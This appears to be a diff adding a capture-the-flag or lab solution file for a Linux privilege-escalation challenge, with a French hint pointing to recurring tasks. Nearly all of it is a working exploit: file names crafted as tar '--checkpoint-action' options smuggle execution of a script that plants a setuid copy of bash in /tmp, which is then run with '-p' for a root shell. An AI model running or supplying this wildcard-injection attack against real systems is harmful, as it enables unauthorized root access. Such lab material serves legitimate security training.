@@ -1,0 +1,8 @@
+#SOLUTION :
+# mkdir /tmp/abcd
+# cd /tmp/abcd 
+# echo '/usr/bin/cp /bin/bash /tmp/mybash && chmod 4777 /tmp/mybash' > exploit.sh  && echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh exploit.sh' && chmod 777 /tmp/abcd/*
+# /tmp/mybash -p
+
+#Hint 1 :
+# Y a-t-il des taches récurrentes ?
